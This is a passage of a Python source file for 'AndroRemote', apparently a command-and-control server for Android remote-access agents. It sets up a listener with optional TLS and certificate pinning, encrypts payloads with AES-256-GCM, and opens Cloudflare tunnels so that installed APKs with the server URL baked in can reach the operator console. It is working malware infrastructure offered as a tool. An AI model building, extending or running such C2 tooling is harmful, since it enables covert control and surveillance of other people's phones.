            err(f"{type(e).__name__}: {escape(str(e))}")
    try:
        readline.set_history_length(1000)
        readline.write_history_file(HISTORY_FILE)
    except Exception:
        pass


BANNER_ART = r"""
 █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗     ██████╗██████╗
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗   ██╔════╝██╔══██╗
███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║   ██║     ██║  ██║
██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║   ██║     ██║  ██║
██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝██╗╚██████╗██████╔╝
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚═════╝╚═════╝"""

ARGS = None


def main():
    global ARGS, TLS
    ap = argparse.ArgumentParser(prog="c2.py", description="AndroRemote C2 server")
    ap.add_argument("--port", type=int, default=PORT_DEFAULT)
    ap.add_argument("--tls", action="store_true",
                    help="TLS listener (self-signed, auto-generated) for LAN/https agents")
    ap.add_argument("--no-enc", action="store_true", help="disable AES-256-GCM payload encryption")
    ap.add_argument("--tunnel", choices=["named", "quick", "off"], default=None,
                    help="override tunnel mode (default: named if configured, else quick)")
    ap.add_argument("--setup-tunnel", metavar="HOSTNAME",
                    help="one-time: create a persistent named Cloudflare tunnel")
    ARGS = ap.parse_args()

    console.print(BANNER_ART, style="cyan bold", markup=False)
    console.print("[dim]        Android agent · command & control · operator console[/dim]\n")

    os.makedirs(HOME_DIR, exist_ok=True)
    load_aliases()

    if ARGS.setup_tunnel:
        cmd_setup_tunnel(ARGS.setup_tunnel)
        return

    console.print(Rule("INITIALIZING", style="dim"))
    console.print(f"  [white bold]listener[/white bold]   "
                  + (f"[green]https://0.0.0.0:{ARGS.port}[/green]  [dim](TLS)[/dim]"
                     if ARGS.tls else f"[green]http://0.0.0.0:{ARGS.port}[/green]"))
    srv = ThreadingHTTPServer(("0.0.0.0", ARGS.port), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    if ARGS.tls:
        TLS = True
        ensure_cert()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(CERT_FILE, CERT_KEY_FILE)
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
        console.print(f"  [white bold]cert pin[/white bold]    [cyan]{cert_pin()}[/cyan]  "
                      f"[dim](bake with: C2_PIN={cert_pin()} ./build.sh <url>)[/dim]")
    if not ARGS.no_enc:
        load_key()
        console.print(f"  [white bold]crypto[/white bold]     [green]AES-256-GCM[/green] "
                      f"[dim]key {key_fp()}…  ({KEY_FILE})[/dim]")
    else:
        console.print("  [white bold]crypto[/white bold]     [yellow]disabled[/yellow] [dim](--no-enc)[/dim]")

    mode = ARGS.tunnel or ("named" if tunnel_named_cfg() else "quick")
    if mode == "named" and not tunnel_named_cfg():
        mode = "quick"
    if mode == "named":
        cfg = tunnel_named_cfg()
        TUNNEL["url"] = f"https://{cfg['hostname']}"
        console.print(f"  [white bold]tunnel[/white bold]     [green]https://{cfg['hostname']}[/green] "
                      f"[dim](persistent named tunnel · supervised)[/dim]")
    elif mode == "quick":
        console.print(f"  [white bold]tunnel[/white bold]     [dim]starting quick tunnel "
                      f"(URL arrives in a few seconds)…[/dim]")
        console.print(f"  [yellow bold]warning[/yellow bold]   [yellow]quick-tunnel URL rotates on every "
                      f"restart — installed APKs bake the old URL and will NOT reconnect. "
                      f"For a restart-proof URL run once: "
                      f"python3 c2.py --setup-tunnel c2.yourdomain.com[/yellow]")
    start_tunnel_thread(mode)
    console.print(f"  [white bold]started[/white bold]    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    try:
        repl()
    finally:
        TUNNEL["run"] = False
        srv.shutdown()
        if TUNNEL["proc"] and TUNNEL["proc"].poll() is None:
            TUNNEL["proc"].terminate()
        ev("*", "shutting down — listener closed, tunnel terminated", "yellow")


if __name__ == "__main__":
    main()
